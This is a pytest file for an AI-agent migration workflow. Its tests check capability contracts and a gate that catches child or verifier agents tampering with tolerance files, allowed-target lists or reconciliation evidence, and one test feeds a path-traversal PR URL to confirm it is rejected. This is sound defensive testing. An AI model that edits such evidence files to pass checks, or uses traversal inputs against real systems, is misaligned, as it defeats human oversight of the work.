import ast
import asyncio
from collections import Counter
import hashlib
import json
import os
import re
import shlex
import subprocess
import sys
from pathlib import Path

import pytest


WORKFLOW = Path(__file__).with_name("workflow.py")


def _functions():
    tree = ast.parse(WORKFLOW.read_text())
    selected = [node for node in tree.body
                if (isinstance(node, ast.FunctionDef)
                    and node.name in {"validate_manifest", "validate_verify", "ledger_violations"})
                or (isinstance(node, ast.Assign) and any(
                    isinstance(t, ast.Name) and t.id in {"VERIFY_DEPTHS", "GUARD_MODES", "STOP_MODES", "UNIT_ID", "WORD",
                                                         "PARAM_VALUE"}
                    for t in node.targets))]
    namespace = {"Counter": Counter, "re": re}
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), namespace)
    return namespace


def _batch_runtime():
    tree = ast.parse(WORKFLOW.read_text())
    selected = [node for node in tree.body
                if (isinstance(node, ast.ClassDef) and node.name == "Breaker")
                or (isinstance(node, ast.AsyncFunctionDef) and node.name == "run_batch")
                or (isinstance(node, ast.FunctionDef) and node.name in {"ledger_violations", "prompt_sha"})
                or (isinstance(node, ast.Assign) and any(
                    isinstance(t, ast.Name) and t.id == "MERGE_EVIDENCE_MODES" for t in node.targets))]
    namespace = {
        "asyncio": asyncio,
        "Counter": Counter,
        "hashlib": hashlib,
        "REPLAYED": {},
        "CHILD_SCHEMA": {},
        "REPO": ".",
        "WorkflowAgentError": RuntimeError,
        "child_prompt": lambda batch: json.dumps(batch, sort_keys=True),
        "log": lambda message: None,
        "pr_changed_paths": lambda pr_url: ("c" * 40, []),
    }
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), namespace)
    return namespace


def test_validate_verify_missing_and_extra_verdicts():
    validate_verify = _functions()["validate_verify"]
    passed = [{"batch": "w2-b03", "pr_url": "https://example/pr/3"}]
    missing = validate_verify({"wave_verdict": "PASS", "unit_verdicts": {},
                               "merged_prs": [], "findings": []}, passed, False)
    extra = validate_verify({"wave_verdict": "PASS", "unit_verdicts": {"w2-b03": "PASS", "other": "PASS"},
                             "merged_prs": [], "findings": []}, passed, False)
    assert "missing verdicts for w2-b03" in missing[0]
    assert any("unexpected verdicts" in problem for problem in extra)


def test_validate_verify_contradiction_and_missing_merge():
    validate_verify = _functions()["validate_verify"]
    passed = [{"batch": "w2-b03", "pr_url": "https://example/pr/3"}]
    problems = validate_verify({"wave_verdict": "PASS", "unit_verdicts": {"w2-b03": "FAIL"},
                                "merged_prs": [], "findings": []}, passed, True)
    assert any("contradict" in problem for problem in problems)
    assert any("missing https://example/pr/3" in problem for problem in problems)


@pytest.mark.parametrize("value", [0, True, "3"])
def test_validate_manifest_rejects_invalid_positive_integer(value):
    validate_manifest = _functions()["validate_manifest"]
    manifest = {"wave": 1, "repo": "repo", "child_macro": "child",
                "verify_macro": "verify", "batches": [{"id": "b", "units": ["u"],
                "write_targets": ["t"], "brief": "brief"}], "width": value}
    with pytest.raises(SystemExit, match="width"):
        validate_manifest(manifest)


CAPS = {"identity": "sp-1", "catalogs": ["mig"], "ready": True, "guard_mode": "block", "stop_mode": "soft"}
HOST = "https://adb-1.azuredatabricks.net"


def _caps(**changes):
    return {**CAPS, **changes}


def _manifest(**extra):
    m = {"wave": 1, "repo": "repo", "child_macro": "child", "verify_macro": "verify",
         "capabilities": _caps(host=HOST),
         "batches": [{"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "brief"}]}
    m.update(extra)
    return m


@pytest.mark.parametrize("caps", [
    "sp@x",                                   # not a dict
    {k: v for k, v in CAPS.items() if k != "identity"},
    _caps(identity=""),
    _caps(catalogs=[]),
    _caps(catalogs="mig"),
    _caps(catalogs=["mig", ""]),
    _caps(ready=False),
    {k: v for k, v in CAPS.items() if k != "ready"},
    _caps(ready=None),
    _caps(ready="true"),
    _caps(ready=1),
    {k: v for k, v in CAPS.items() if k != "guard_mode"},
    _caps(guard_mode="off"),
    {k: v for k, v in CAPS.items() if k != "stop_mode"},
    _caps(stop_mode="medium"),
])
def test_validate_manifest_rejects_bad_capability_contract(caps):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="capabilities"):
        validate_manifest(_manifest(capabilities=caps))


def test_validate_manifest_rejects_missing_capabilities():
    validate_manifest = _functions()["validate_manifest"]
    m = _manifest()
    del m["capabilities"]
    with pytest.raises(SystemExit, match="capabilities"):
        validate_manifest(m)


@pytest.mark.parametrize("manifest", [
    _manifest(capabilities=_caps(stop_mode="hard")),                    # auto_merge defaults to true
    _manifest(capabilities=_caps(stop_mode="hard"), auto_merge=True),
    _manifest(auto_merge="false"),
])
def test_validate_manifest_hard_stop_mode_forbids_auto_merge(manifest):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="auto_merge"):
        validate_manifest(manifest)


def test_validate_manifest_accepts_capability_contract():
    validate_manifest = _functions()["validate_manifest"]
    validate_manifest(_manifest())
    validate_manifest(_manifest(auto_merge=True))
    validate_manifest(_manifest(capabilities=_caps(stop_mode="hard", guard_mode="warn"), auto_merge=False))


def test_child_prompt_embeds_capability_contract():
    ns = _prompt_ns(_manifest())
    text = ns["child_prompt"](ns["MANIFEST"]["batches"][0])
    assert "--expect-identity sp-1" in text
    assert '"catalogs": ["mig"]' in text
    assert '"guard_mode": "block"' in text and '"stop_mode": "soft"' in text
    assert "BLOCKED" in text


def test_child_prompt_names_exactly_its_batch_units_for_the_doctor():
    # the child preflight covers its whole batch: the brief spells out one --unit per unit it owns,
    # so a shorter list would be a visible deviation, and the doctor resolves the mapping paths
    ns = _prompt_ns(_manifest(batches=[
        {"id": "b", "units": ["loans", "payments"], "write_targets": ["t"], "brief": "brief"},
        {"id": "c", "units": ["fees"], "write_targets": ["t2"], "brief": "brief"},
    ]))
    text = ns["child_prompt"](ns["MANIFEST"]["batches"][0])
    assert "--role child --expect-identity sp-1 --unit loans --unit payments (exactly this batch" in text
    assert "--unit fees" not in text and "--mapping" not in text
    assert "mapping_spec.json itself" in text


def test_child_brief_pins_the_contracts_workspace_host_for_the_doctor():
    """The expected principal can resolve against another workspace from a child's own profile or env;
    the brief makes the doctor compare the host the contract records, not only the identity."""
    ns = _prompt_ns(_manifest())
    assert f"--expect-host {HOST}" in ns["child_prompt"](ns["MANIFEST"]["batches"][0])
    odd = _prompt_ns(_manifest(capabilities=_caps(host="https://x.net/a b")))
    assert "--expect-host 'https://x.net/a b'" in odd["child_prompt"](odd["MANIFEST"]["batches"][0])


@pytest.mark.parametrize("manifest", [
    _manifest(verify_depth="threshold"),   # verifier depth is a plan decision, never tolerance-driven
    _manifest(verify_depth="deep"),
    _manifest(batches=[{"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "brief",
                        "verify_depth": "none"}]),
    _manifest(cost_estimate="cheap"),
])
def test_validate_manifest_rejects_bad_depth_or_cost(manifest):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="verify_depth|cost_estimate"):
        validate_manifest(manifest)


def test_validate_manifest_accepts_depth_knob_and_estimate():
    validate_manifest = _functions()["validate_manifest"]
    validate_manifest(_manifest(verify_depth="full", cost_estimate={"source_statements": 12}))
    validate_manifest(_manifest(batches=[{"id": "b", "units": ["u"], "write_targets": ["t"],
                                          "brief": "brief", "verify_depth": "sampled"}]))


def _prompt_ns(manifest):
    tree = ast.parse(WORKFLOW.read_text())
    names = {"verify_prompt", "batch_verify_depth", "child_prompt", "capability_block",
             "sum_cost", "cost_line"}
    selected = [node for node in tree.body
                if (isinstance(node, ast.FunctionDef) and node.name in names)
                or (isinstance(node, ast.Assign) and any(
                    isinstance(t, ast.Name) and t.id in {"COST_KEYS", "MERGE_EVIDENCE_MODES"}
                    for t in node.targets))]
    ns = {"json": __import__("json"), "shlex": __import__("shlex"), "WAVE": 1, "REPO": "repo", "MANIFEST": manifest,
          "BATCHES": manifest["batches"], "VERIFY_DEPTH": manifest.get("verify_depth", "sampled")}
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), ns)
    return ns


def test_verifier_prompt_carries_per_batch_depth_defaulting_to_sampled():
    m = _manifest(batches=[
        {"id": "b1", "units": ["u"], "write_targets": ["t1"], "brief": "x"},
        {"id": "b2", "units": ["v"], "write_targets": ["t2"], "brief": "y", "verify_depth": "full"}])
    ns = _prompt_ns(m)
    # the shape main() hands the verifier: {"batch": id, ...}, no verify_depth on the record
    passed = [{"batch": b["id"], "units": b["units"], "pr_url": "", "branch": ""} for b in m["batches"]]
    text = ns["verify_prompt"](passed, True)
    assert '"b1": "sampled"' in text and '"b2": "full"' in text
    assert "--depth" in text and "Never lower" in text and "recon_cost" in text
    ns2 = _prompt_ns(_manifest(verify_depth="full"))
    assert '"b": "full"' in ns2["verify_prompt"]([{"batch": "b", "units": ["u"]}], True)


def test_child_prompt_asks_for_recon_cost():
    ns = _prompt_ns(_manifest())
    assert "recon_cost" in ns["child_prompt"](ns["MANIFEST"]["batches"][0])


def test_cost_line_compares_estimate_with_summed_actuals():
    m = _manifest(cost_estimate={"source_statements": 10, "source_rows_fetched": 1000})
    ns = _prompt_ns(m)
    results = [{"recon_cost": {"source_statements": 4, "target_statements": 2,
                               "source_rows_fetched": 300, "target_rows_fetched": 300, "elapsed_s": 1.2}},
               {"status": "BLOCKED"}]
    verify = {"recon_cost": {"source_statements": 3, "target_statements": None,
                             "source_rows_fetched": 100, "target_rows_fetched": 100, "elapsed_s": 0.8}}
    line = ns["cost_line"](results, verify)
    assert "estimated source_statements=10, source_rows_fetched=1000" in line
    assert "source_statements=7" in line and "source_rows_fetched=400" in line
    assert "target_statements=" not in line.split("actual")[1].split(",")[0]  # None side is omitted
    assert "harness time 2s" in line and "Verifier depth sampled" in line
    assert _prompt_ns(_manifest())["cost_line"]([{"status": "FAIL"}], None).startswith("Cost: no estimate")


def test_replayed_failures_do_not_refill_breaker():
    namespace = _batch_runtime()
    namespace["REPLAYED"] = {f"b{i}": "FAIL" for i in range(3)}

    async def agent(prompt, **kwargs):
        if kwargs["label"] in namespace["REPLAYED"]:
            return {"status": "FAIL", "recon_verdict": "NOT_RUN",
                    "failure_class": "same", "one_line_summary": "replayed"}
        return {"status": "PASS", "recon_verdict": "PASS", "recon_mode": "live",
                "pr_url": "https://example/pr/held", "branch": "feature/held",
                "changed_paths": ["src/held.sql"], "one_line_summary": "held passed"}

    namespace["agent"] = agent

    async def exercise():
        breaker = namespace["Breaker"](3)
        sem = asyncio.Semaphore(1)
        outputs = []
        for batch_id in ("b0", "b1", "b2", "b3"):
            outputs.append(await namespace["run_batch"](
                {"id": batch_id, "units": ["u"], "write_targets": ["t"], "brief": "b"},
                sem, breaker))
        return outputs, breaker

    outputs, breaker = asyncio.run(exercise())
    assert outputs[-1]["status"] == "PASS"
    assert breaker.tripped_on is None


def test_pass_without_pr_is_downgraded():
    namespace = _batch_runtime()

    async def agent(prompt, **kwargs):
        return {"status": "PASS", "recon_verdict": "PASS", "recon_mode": "live",
                "branch": "feature/no-url", "one_line_summary": "passed"}

    namespace["agent"] = agent

    async def exercise():
        breaker = namespace["Breaker"](3)
        return await namespace["run_batch"](
            {"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "b"},
            asyncio.Semaphore(1), breaker)

    output = asyncio.run(exercise())
    assert output["status"] == "FAIL"
    assert output["failure_class"] == "missing_pr"


BATCH = {"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "b"}


def _run_one(namespace, report):
    async def agent(prompt, **kwargs):
        return dict(report)

    namespace["agent"] = agent

    async def exercise():
        return await namespace["run_batch"](
            dict(BATCH),
            asyncio.Semaphore(1), namespace["Breaker"](3))

    return asyncio.run(exercise())


@pytest.mark.parametrize("mode", ["live", "snapshot", "transactional"])
def test_pass_with_merge_evidence_mode_is_kept(mode):
    out = _run_one(_batch_runtime(), {"status": "PASS", "recon_verdict": "PASS", "recon_mode": mode,
                                      "pr_url": "https://example/pr/1", "branch": "f", "changed_paths": ["src/a.sql"],
                                      "one_line_summary": "ok"})
    assert out["status"] == "PASS" and "failure_class" not in out


@pytest.mark.parametrize("mode", ["fixture", "continuous", None])
def test_pass_without_merge_evidence_is_downgraded(mode):
    out = _run_one(_batch_runtime(), {"status": "PASS", "recon_verdict": "PASS", "recon_mode": mode,
                                      "pr_url": "https://example/pr/1", "branch": "f", "one_line_summary": "ok"})
    assert out["status"] == "FAIL" and out["failure_class"] == "non_merge_evidence"


def test_prompts_name_every_merge_evidence_mode():
    ns = _prompt_ns(_manifest())
    child = ns["child_prompt"](_manifest()["batches"][0])
    verify = ns["verify_prompt"]([{"batch": "b", "pr_url": "https://example/pr/1"}], False)
    for mode in ("live", "snapshot", "transactional"):
        assert mode in child and mode in verify
    assert "Fixture evidence is never PASS" in child


def test_first_run_requires_wave_run_id():
    tree = ast.parse(WORKFLOW.read_text())
    selected = [node for node in tree.body
                if isinstance(node, ast.AsyncFunctionDef) and node.name == "main"]
    namespace = {
        "resume": False,
        "os": os,
        "RUN_ID_PATH": Path(".migration/waves/wave-1.run_id"),
    }
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), namespace)
    old = os.environ.pop("WAVE_RUN_ID", None)
    try:
        with pytest.raises(SystemExit, match="WAVE_RUN_ID is required on the first run"):
            asyncio.run(namespace["main"]())
    finally:
        if old is not None:
            os.environ["WAVE_RUN_ID"] = old


# ---------------------------------------------------------------- ledger gate (changed_paths)

LEDGER_FILES = [".migration/03_recon_tolerances.json", ".migration/allowed_targets.json",
                ".migration/06_decisions.md", ".migration/09_capabilities.json", ".migration/units/u/mapping_spec.json"]


def _pass(**extra):
    return {"status": "PASS", "recon_verdict": "PASS", "recon_mode": "live", "pr_url": "https://example/pr/1",
            "branch": "f", "one_line_summary": "ok", **extra}


def test_clean_diff_stays_pass_and_recon_evidence_for_its_own_units_is_allowed():
    ns = _batch_runtime()
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql", ".migration/recon/u/result.json"]))
    assert out["status"] == "PASS" and "failure_class" not in out
    assert ns["ledger_violations"](["a.py", ".migration/recon/u/x", ".migration/recon/u/deep/y"], ["u"]) == []


@pytest.mark.parametrize("path", LEDGER_FILES + [".migration/recon/other_unit/result.json", ".migration/recon/wave-1/report.md"])
def test_diff_touching_the_ledger_is_downgraded_to_ledger_tampered(path):
    out = _run_one(_batch_runtime(), _pass(changed_paths=["src/loans.sql", path]))
    assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered"
    assert path in out["one_line_summary"] and out["one_line_summary"].startswith("PASS downgraded")


@pytest.mark.parametrize("report", [_pass(), _pass(changed_paths="src/x.sql"), _pass(changed_paths=[".migration/x", 3])])
def test_pass_without_a_usable_changed_paths_is_not_pass(report):
    out = _run_one(_batch_runtime(), report)
    assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered"
    assert "changed_paths" in out["one_line_summary"]


def test_a_failed_child_that_touched_the_ledger_is_still_reclassified():
    out = _run_one(_batch_runtime(), {"status": "FAIL", "recon_verdict": "FAIL", "recon_mode": "live",
                                      "failure_class": "decimal_rounding", "one_line_summary": "off by one",
                                      "changed_paths": [".migration/03_recon_tolerances.json"]})
    assert out["failure_class"] == "ledger_tampered"


def test_breaker_counts_ledger_tampering():
    ns = _batch_runtime()

    async def agent(prompt, **kwargs):
        return _pass(changed_paths=[".migration/allowed_targets.json"])

    ns["agent"] = agent

    async def exercise():
        breaker = ns["Breaker"](3)
        for i in range(3):
            await ns["run_batch"]({"id": f"b{i}", "units": ["u"], "write_targets": ["t"], "brief": "b"},
                                  asyncio.Semaphore(1), breaker)
        return breaker

    assert asyncio.run(exercise()).tripped_on == "ledger_tampered"


def test_child_schema_requires_changed_paths():
    tree = ast.parse(WORKFLOW.read_text())
    ns = {t.id: ast.literal_eval(node.value) for node in tree.body if isinstance(node, ast.Assign)
          for t in node.targets if isinstance(t, ast.Name) and t.id.endswith("_SCHEMA")}
    for schema in (ns["CHILD_SCHEMA"], ns["VERIFY_SCHEMA"]):
        assert "changed_paths" in schema["required"]
        assert schema["properties"]["changed_paths"]["items"] == {"type": "string"}
        assert "git diff --name-only" in schema["properties"]["changed_paths"]["description"]


def test_prompts_demand_changed_paths_and_base_branch_policy_files():
    ns = _prompt_ns(_manifest())
    child = ns["child_prompt"](_manifest()["batches"][0])
    assert "git diff --name-only" in child and "changed_paths" in child
    assert ".migration/recon/<unit_id>/" in child and "ledger_tampered" in child
    verify = ns["verify_prompt"]([{"batch": "b", "units": ["u"], "pr_url": "https://example/pr/1"}], False)
    assert "git diff --name-only" in verify and "changed_paths" in verify
    assert "03_recon_tolerances.json" in verify and "allowed_targets.json" in verify
    assert "base branch" in verify and "not the PR" in verify
    assert ".migration/recon/<unit_id>/" in verify and "ledger_tampered" in verify


def test_validate_verify_requires_changed_paths_inside_the_wave_report_dir():
    validate_verify = _functions()["validate_verify"]
    passed = [{"batch": "w2-b03", "units": ["u"], "pr_url": "https://example/pr/3"}]
    ok = {"wave_verdict": "PASS", "unit_verdicts": {"w2-b03": "PASS"}, "merged_prs": [], "findings": [],
          "changed_paths": [".migration/recon/wave-2/report.md"]}
    assert validate_verify(ok, passed, False, wave=2, observed=[]) == []
    problems = validate_verify({**ok, "changed_paths": [".migration/recon/wave-2/report.md",
                                                        ".migration/03_recon_tolerances.json"]}, passed, False, 2, [])
    assert problems == ["verifier output invalid: ledger tampered, changed .migration/03_recon_tolerances.json"]
    problems = validate_verify({**ok, "changed_paths": [".migration/recon/wave-3/report.md"]}, passed, False, 2, [])
    assert problems == ["verifier output invalid: ledger tampered, changed .migration/recon/wave-3/report.md"]
    problems = validate_verify({k: v for k, v in ok.items() if k != "changed_paths"}, passed, False, 2, [])
    assert problems == ["verifier output invalid: changed_paths must be a list of paths (git diff --name-only)"]


def test_validate_verify_reads_the_report_branch_from_git_not_only_the_self_report():
    validate_verify = _functions()["validate_verify"]
    passed = [{"batch": "w2-b03", "units": ["u"], "pr_url": "https://example/pr/3"}]
    ok = {"wave_verdict": "PASS", "unit_verdicts": {"w2-b03": "PASS"}, "merged_prs": [], "findings": [],
          "changed_paths": [".migration/recon/wave-2/report.md"]}
    assert validate_verify(ok, passed, False, wave=2, observed=[".migration/recon/wave-2/report.md"]) == []
    tampered = validate_verify(ok, passed, False, wave=2,
                               observed=[".migration/recon/wave-2/report.md", ".migration/allowed_targets.json"])
    assert tampered == ["verifier output invalid: ledger tampered, changed .migration/allowed_targets.json"]
    unverifiable = validate_verify(ok, passed, False, wave=2, observed=None)
    assert len(unverifiable) == 1 and "recon/wave-2" in unverifiable[0] and "git" in unverifiable[0]
    # `observed` is what the verifier itself changed (verifier_changed_paths): a passed unit's evidence in
    # it means the verifier rewrote it, which is not the verifier's to do
    problems = validate_verify(ok, passed, False, wave=2,
                               observed=[".migration/recon/wave-2/report.md", ".migration/recon/u/result.json"])
    assert problems == ["verifier output invalid: ledger tampered, changed .migration/recon/u/result.json"]
    src = WORKFLOW.read_text()
    assert 'validate_verify(verify, passed, auto_merge, WAVE, verifier_changed_paths(WAVE, passed))' in src


# ---------------------------------------------------------------- capability contract vs the doctor's record (A3)

DOCTOR = {"schema": "dbx-migration-factory/capabilities/1", "ready": True,
          "identity": {"userName": "sp-1", "service_principal": True, "host": "https://adb-1.azuredatabricks.net"},
          "checks": [{"id": "allowed_targets", "status": "ok", "data": {"catalogs": ["mig"], "guard_mode": "block"}},
                     {"id": "stop_mode", "status": "ok", "data": {"stop_mode": "soft"}}]}


def test_validate_manifest_compares_the_contract_with_the_doctor_record():
    validate_manifest = _functions()["validate_manifest"]
    validate_manifest(_manifest(capabilities=_caps(host=DOCTOR["identity"]["host"])), DOCTOR)
    # the doctor records guard-normalized catalog names; a manifest spelling the guard accepts is the same contract
    validate_manifest(_manifest(capabilities=_caps(host=DOCTOR["identity"]["host"], catalogs=["`MIG` "])), DOCTOR)
    for caps, needle in ((_caps(), "host"),
                         (_caps(host="https://adb-2.azuredatabricks.net"), "host"),
                         (_caps(host=DOCTOR["identity"]["host"], identity="sp-2"), "identity"),
                         (_caps(host=DOCTOR["identity"]["host"], catalogs=["mig", "prod"]), "catalogs"),
                         (_caps(host=DOCTOR["identity"]["host"], guard_mode="warn"), "guard_mode"),
                         (_caps(host=DOCTOR["identity"]["host"], stop_mode="hard"), "stop_mode")):
        with pytest.raises(SystemExit, match=f"capabilities.*{needle}.*09_capabilities.json"):
            validate_manifest(_manifest(capabilities=caps, auto_merge=False), DOCTOR)
    with pytest.raises(SystemExit, match="ready"):
        validate_manifest(_manifest(capabilities=_caps(host=DOCTOR["identity"]["host"])), {**DOCTOR, "ready": False})
    with pytest.raises(SystemExit, match="09_capabilities.json"):
        validate_manifest(_manifest(capabilities=_caps(host=DOCTOR["identity"]["host"])), {**DOCTOR, "identity": None})


def test_workflow_launches_from_a_fresh_doctor_run_not_the_editable_record():
    src = WORKFLOW.read_text()
    assert "RECORDED" not in src and "DOCTOR = fresh_doctor_report(MANIFEST)" in src
    assert "validate_manifest(MANIFEST, DOCTOR)" in src


def _launch_ns(tmp_path, fake_run):
    tree = ast.parse(WORKFLOW.read_text())
    selected = [node for node in tree.body
                if (isinstance(node, ast.FunctionDef)
                    and node.name in {"fresh_doctor_report", "pr_changed_paths", "ref_changed_paths", "wave_base",
                                      "launch_base", "verifier_changed_paths", "_git_paths", "_base_tip"})
                or (isinstance(node, ast.Assign) and any(
                    isinstance(t, ast.Name) and t.id == "PR_URL" for t in node.targets))]
    ns = {"json": json, "os": os, "re": re, "sys": sys, "subprocess": subprocess, "Path": Path, "ROOT": tmp_path,
          "BASE_BRANCH": "main", "BASE_SHA": "b" * 40, "REPO": "github.com/acme/dbx-target", "resume": False,
          "DOCTOR_PY": Path("/plugin/skills/factory-doctor/doctor.py"),
          "MANIFEST_PATH": tmp_path / ".migration" / "waves" / "wave-1.json",
          "BASE_SHA_PATH": tmp_path / ".migration" / "waves" / "wave-1.base_sha"}
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), ns)
    ns["subprocess"] = type("S", (), {"run": staticmethod(fake_run), "SubprocessError": subprocess.SubprocessError,
                                        "CalledProcessError": subprocess.CalledProcessError})
    return ns


def _doctor_writer(calls, fresh, rc=1):
    def fake_run(cmd, **kw):
        calls.append(cmd)
        Path(cmd[cmd.index("--out") + 1]).parent.mkdir(parents=True, exist_ok=True)
        Path(cmd[cmd.index("--out") + 1]).write_text(json.dumps(fresh))
        return subprocess.CompletedProcess(cmd, rc)
    return fake_run


def test_fresh_doctor_report_reruns_the_doctor_with_this_sessions_hook_probe_only(tmp_path, monkeypatch):
    calls = []
    fresh = {"ready": True, "identity": {"userName": "sp-1", "host": "h"}, "checks": []}
    ns = _launch_ns(tmp_path, _doctor_writer(calls, fresh))
    manifest = _manifest(source={"family": "sqlserver", "secret": "LEGACY_ODBC", "params": {"db": "loan_servicing"}})
    monkeypatch.delenv("WAVE_HOOK_PROBE", raising=False)
    assert ns["fresh_doctor_report"](manifest) == fresh
    cmd = calls[0]
    assert cmd[:2] == [sys.executable, str(ns["DOCTOR_PY"])]
    assert cmd[cmd.index("--workspace") + 1] == str(tmp_path)
    assert cmd[cmd.index("--out") + 1] == str(tmp_path / ".migration" / "waves" / "wave-1.doctor.json")
    # no probe result from the launching session: the doctor decides (hook row unverified, not ready)
    assert cmd[cmd.index("--hook-probe-result") + 1] == "unknown"
    assert cmd[cmd.index("--expect-identity") + 1] == "sp-1" and cmd[cmd.index("--expect-catalogs") + 1] == "mig"
    assert cmd[cmd.index("--expect-host") + 1] == HOST
    with pytest.raises(SystemExit, match="capabilities.host"):  # no host to hold anyone to: no doctor run, no wave
        ns["fresh_doctor_report"](_manifest(capabilities=_caps()))
    assert cmd[cmd.index("--source-family") + 1] == "sqlserver" and cmd[cmd.index("--source-secret") + 1] == "LEGACY_ODBC"
    assert cmd[cmd.index("--param") + 1] == "db=loan_servicing" and "--no-databricks" not in cmd
    # the probe the launching session ran is passed through verbatim; the doctor checks the nonce
    monkeypatch.setenv("WAVE_HOOK_PROBE", "blocked:ab12cd34")
    ns["fresh_doctor_report"](_manifest())
    assert calls[-1][calls[-1].index("--hook-probe-result") + 1] == "blocked:ab12cd34" and "--source-family" not in calls[-1]


def test_fresh_doctor_report_refuses_to_launch_without_a_report(tmp_path):
    ns = _launch_ns(tmp_path, lambda cmd, **kw: subprocess.CompletedProcess(cmd, 1))
    with pytest.raises(SystemExit, match="doctor"):
        ns["fresh_doctor_report"](_manifest())


def test_fresh_doctor_report_never_reads_a_stale_report(tmp_path):
    stale = tmp_path / ".migration" / "waves" / "wave-1.doctor.json"
    stale.parent.mkdir(parents=True)
    stale.write_text(json.dumps({"ready": True, "identity": {"userName": "sp-1", "host": "h"}, "checks": []}))
    # the doctor crashes (or rejects its arguments) before writing: the old ready report must not stand
    for rc in (2, 1):
        ns = _launch_ns(tmp_path, lambda cmd, rc=rc, **kw: subprocess.CompletedProcess(cmd, rc))
        with pytest.raises(SystemExit, match="doctor"):
            ns["fresh_doctor_report"](_manifest())
        assert not stale.exists()
    # a written report with an exit code other than ready (0) / not ready (1) is an argument error or crash
    ns = _launch_ns(tmp_path, _doctor_writer([], {"ready": True}, rc=2))
    with pytest.raises(SystemExit, match="doctor"):
        ns["fresh_doctor_report"](_manifest())


def _git_fake(calls, head, merged, paths):
    """git as the gate sees it: the PR head fetched into FETCH_HEAD, origin/main at 't'*40 (fresh fetch),
    `merge-base --is-ancestor` answering whether the head is already in it, one diff."""
    def fake_run(cmd, **kw):
        calls.append(cmd)
        if cmd[3] == "fetch":
            return subprocess.CompletedProcess(cmd, 0)
        if cmd[3] == "rev-parse":
            return subprocess.CompletedProcess(cmd, 0, stdout=("t" * 40 if "origin/main^{commit}" in cmd else head) + "\n")
        if cmd[3] == "merge-base":
            return subprocess.CompletedProcess(cmd, 0 if merged else 1)
        return subprocess.CompletedProcess(cmd, 0, stdout=paths)
    return fake_run


def test_pr_changed_paths_comes_from_the_pr_head_ref_of_this_repo(tmp_path):
    calls = []
    ns = _launch_ns(tmp_path, _git_fake(calls, "c" * 40, False, "src/a.sql\n.migration/allowed_targets.json\n"))
    # the gated head's sha comes back with the paths: the verifier's tree is later held to exactly it
    assert ns["pr_changed_paths"]("https://github.com/acme/dbx-target/pull/42") == (
        "c" * 40, ["src/a.sql", ".migration/allowed_targets.json"])
    # the host writes refs/pull/N/head; the child's branch name never reaches git
    assert calls[0] == ["git", "-C", str(tmp_path), "fetch", "-q", "origin", "refs/pull/42/head"]
    assert calls[1][3:] == ["rev-parse", "--verify", "FETCH_HEAD^{commit}"]
    # the base is fetched now, not read from the launch snapshot: a child launched on a resume forked from
    # a base the verifier had merged accepted units into, and those units are not its diff
    assert calls[2][3:] == ["fetch", "-q", "origin", "+refs/heads/main:refs/remotes/origin/main"]
    assert calls[3][3:] == ["rev-parse", "--verify", "origin/main^{commit}"]
    assert calls[4][3:] == ["merge-base", "--is-ancestor", "c" * 40, "t" * 40]
    # --no-renames: a ledger file moved under an allowed recon/ path must still surface its old path.
    # An unmerged head diffs from its own fork point on the base (three-dot against the fresh tip)
    assert calls[5][3:] == ["diff", "--name-only", "--no-renames", "t" * 40 + "..." + "c" * 40]
    assert len(calls) == 6
    calls.clear()
    # a head the base already contains (the verifier merged it before the run stopped, or a child merged
    # its own PR) would be its own merge base and diff to nothing: it is anchored at the launch base instead
    ns = _launch_ns(tmp_path, _git_fake(calls, "c" * 40, True, "src/a.sql\n"))
    assert ns["pr_changed_paths"]("https://github.com/acme/dbx-target/pull/42") == ("c" * 40, ["src/a.sql"])
    assert calls[5][3:] == ["diff", "--name-only", "--no-renames", "b" * 40 + "..." + "c" * 40]
    calls.clear()
    for url in ("https://github.com/other/repo/pull/42", "https://github.com/acme/dbx-target/pull/x",
                "https://github.com/acme/dbx-target/pull/42/../../other/repo/pull/1", "", None, 42):
        assert ns["pr_changed_paths"](url) is None
    assert calls == []

    def failing(cmd, **kw):
        raise subprocess.CalledProcessError(128, cmd)

    assert _launch_ns(tmp_path, failing)["pr_changed_paths"]("https://github.com/acme/dbx-target/pull/42") is None
    assert _launch_ns(tmp_path, failing)["ref_changed_paths"]("recon/wave-2") is None


def test_the_ledger_base_is_snapshotted_once_at_launch_before_any_wave_pr_can_merge(tmp_path):
    calls = []

    def fake_run(cmd, **kw):
        calls.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, stdout="a" * 40 + "\n")

    ns = _launch_ns(tmp_path, fake_run)
    assert ns["wave_base"]() == "a" * 40
    assert calls[0] == ["git", "-C", str(tmp_path), "fetch", "-q", "origin", "+refs/heads/main:refs/remotes/origin/main"]
    assert calls[1] == ["git", "-C", str(tmp_path), "rev-parse", "--verify", "origin/main^{commit}"]

    def failing(cmd, **kw):
        raise subprocess.CalledProcessError(128, cmd)

    with pytest.raises(SystemExit, match="main"):
        _launch_ns(tmp_path, failing)["wave_base"]()
    # a fresh launch persists the sha beside the manifest before the doctor, any child or the verifier runs
    ns["BASE_SHA_PATH"].parent.mkdir(parents=True)
    assert ns["launch_base"]() == "a" * 40
    assert ns["BASE_SHA_PATH"].read_text() == "a" * 40 + "\n"
    # a resume reuses it rather than re-reading a base the verifier has merged into (the run may have
    # stopped before writing any result), and cannot run without it
    calls.clear()
    ns["resume"] = True
    assert ns["launch_base"]() == "a" * 40 and calls == []
    for bad in ("origin/main\n", ""):
        ns["BASE_SHA_PATH"].write_text(bad)
        with pytest.raises(SystemExit, match="WAVE_RERUN"):
            ns["launch_base"]()
    ns["BASE_SHA_PATH"].unlink()
    with pytest.raises(SystemExit, match="WAVE_RERUN"):
        ns["launch_base"]()
    src = WORKFLOW.read_text()
